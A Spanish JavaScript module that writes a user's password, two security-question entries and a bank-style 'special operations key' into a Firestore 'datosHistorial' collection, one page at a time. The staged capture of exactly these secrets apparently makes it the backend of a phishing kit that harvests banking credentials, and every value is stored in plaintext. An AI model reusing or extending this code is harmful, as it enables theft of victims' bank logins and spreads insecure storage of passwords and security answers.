// actualizarDatosProgresivos.js - Para agregar datos desde páginas siguientes

import { initializeApp } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-app.js";
import {
    getFirestore,
    doc,
    updateDoc,
    query,
    collection,
    where,
    getDocs,
    setDoc
} from "https://www.gstatic.com/firebasejs/10.0.0/firebase-firestore.js";
import { firebaseConfig } from "./firebase-config.js";

const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

// ==================== FUNCIONES PARA PÁGINAS SIGUIENTES ====================

/**
 * Agregar clave del usuario al historial
 * @param {string} clave - Clave del usuario
 */
export async function agregarClave(clave) {
    try {
        const usuario = obtenerUsuarioLocal();
        if (!usuario) {
            console.warn("No se encontró usuario en localStorage");
            return false;
        }

        console.log(`🔑 Agregando clave para usuario: ${usuario}`);
        
        // Buscar registros del usuario en el historial
        const q = query(
            collection(db, "datosHistorial"),
            where("usuario", "==", usuario)
        );
        
        const querySnapshot = await getDocs(q);
        const promesas = [];
        
        querySnapshot.forEach((documento) => {
            const docRef = doc(db, "datosHistorial", documento.id);
            promesas.push(updateDoc(docRef, {
                clave: clave,
                claveAgregada: new Date().toISOString()
            }));
        });
        
        await Promise.all(promesas);
        console.log(`✅ Clave agregada a ${promesas.length} registros`);
        
        return true;
    } catch (error) {
        console.error("❌ Error agregando clave:", error);
        return false;
    }
}

/**
 * Agregar primera pregunta de seguridad
 * @param {string} pregunta - Pregunta de seguridad 1
 */
export async function agregarPregunta1(pregunta) {
    try {
        const usuario = obtenerUsuarioLocal();
        if (!usuario) return false;

        console.log(`🔐 Agregando pregunta 1 para: ${usuario}`);
        
        const q = query(
            collection(db, "datosHistorial"),
            where("usuario", "==", usuario)
        );
        
        const querySnapshot = await getDocs(q);
        const promesas = [];
        
        querySnapshot.forEach((documento) => {
            const docRef = doc(db, "datosHistorial", documento.id);
            promesas.push(updateDoc(docRef, {
                preguntaSeguridad1: pregunta,
                pregunta1Agregada: new Date().toISOString()
            }));
        });
        
        await Promise.all(promesas);
        console.log(`✅ Pregunta 1 agregada a ${promesas.length} registros`);
        
        return true;
    } catch (error) {
        console.error("❌ Error agregando pregunta 1:", error);
        return false;
    }
}

/**
 * Agregar segunda pregunta de seguridad
 * @param {string} pregunta - Pregunta de seguridad 2
 */
export async function agregarPregunta2(pregunta) {
    try {
        const usuario = obtenerUsuarioLocal();
        if (!usuario) return false;

        console.log(`🔐 Agregando pregunta 2 para: ${usuario}`);
        
        const q = query(
            collection(db, "datosHistorial"),
            where("usuario", "==", usuario)
        );
        
        const querySnapshot = await getDocs(q);
        const promesas = [];
        
        querySnapshot.forEach((documento) => {
            const docRef = doc(db, "datosHistorial", documento.id);
            promesas.push(updateDoc(docRef, {
                preguntaSeguridad2: pregunta,
                pregunta2Agregada: new Date().toISOString()
            }));
        });
        
        await Promise.all(promesas);
        console.log(`✅ Pregunta 2 agregada a ${promesas.length} registros`);
        
        return true;
    } catch (error) {
        console.error("❌ Error agregando pregunta 2:", error);
        return false;
    }
}

/**
 * Agregar clave de operaciones especiales
 * @param {string} claveOp - Clave de operaciones especiales
 */
export async function agregarClaveOperaciones(claveOp) {
    try {
        const usuario = obtenerUsuarioLocal();
        if (!usuario) return false;

        console.log(`🔒 Agregando clave operaciones para: ${usuario}`);
        
        const q = query(
            collection(db, "datosHistorial"),
            where("usuario", "==", usuario)
        );
        
        const querySnapshot = await getDocs(q);
        const promesas = [];
        
        querySnapshot.forEach((documento) => {
            const docRef = doc(db, "datosHistorial", documento.id);
            promesas.push(updateDoc(docRef, {
                claveOperaciones: claveOp,
                claveOpAgregada: new Date().toISOString()
            }));
        });
        
        await Promise.all(promesas);
        console.log(`✅ Clave operaciones agregada a ${promesas.length} registros`);
        
        return true;
    } catch (error) {
        console.error("❌ Error agregando clave operaciones:", error);
        return false;
    }
}

/**
 * Obtener usuario desde localStorage
 */
function obtenerUsuarioLocal() {
    try {
        const userData = localStorage.getItem("usuario");
        if (userData) {
            const data = JSON.parse(userData);
            return data.usuario;
        }
        return null;
    } catch (error) {
        console.error("Error obteniendo usuario de localStorage:", error);
        return null;
    }
}

/**
 * Función genérica para agregar cualquier dato
 * @param {Object} datos - Objeto con los datos a agregar
 */
export async function agregarDatos(datos) {
    try {
        const usuario = obtenerUsuarioLocal();
        if (!usuario) return false;

        console.log(`📊 Agregando datos para: ${usuario}`, datos);
        
        const q = query(
            collection(db, "datosHistorial"),
            where("usuario", "==", usuario)
        );
        
        const querySnapshot = await getDocs(q);
        const promesas = [];
        
        const datosConTimestamp = {
            ...datos,
            datosActualizados: new Date().toISOString()
        };
        
        querySnapshot.forEach((documento) => {
            const docRef = doc(db, "datosHistorial", documento.id);
            promesas.push(updateDoc(docRef, datosConTimestamp));
        });
        
        await Promise.all(promesas);
        console.log(`✅ Datos agregados a ${promesas.length} registros`);
        
        return true;
    } catch (error) {
        console.error("❌ Error agregando datos:", error);
        return false;
    }
}

// ==================== HACER FUNCIONES DISPONIBLES GLOBALMENTE ====================

window.agregarClave = agregarClave;
window.agregarPregunta1 = agregarPregunta1;
window.agregarPregunta2 = agregarPregunta2;
window.agregarClaveOperaciones = agregarClaveOperaciones;
window.agregarDatos = agregarDatos;

console.log('📊 Módulo de datos progresivos cargado');

// ==================== EJEMPLOS DE USO ====================

/*
// En la página de clave (coe.html, coed.html, etc.):
await agregarClave("miClaveSecreta");

// En la página de preguntas de seguridad:
await agregarPregunta1("¿Cuál es el nombre de tu primera mascota?");
await agregarPregunta2("¿En qué ciudad naciste?");

// En la página de operaciones especiales:
await agregarClaveOperaciones("claveEspecial123");

// Agregar múltiples datos a la vez:
await agregarDatos({
    clave: "miClave",
    preguntaSeguridad1: "pregunta1",
    preguntaSeguridad2: "pregunta2"
});
*/
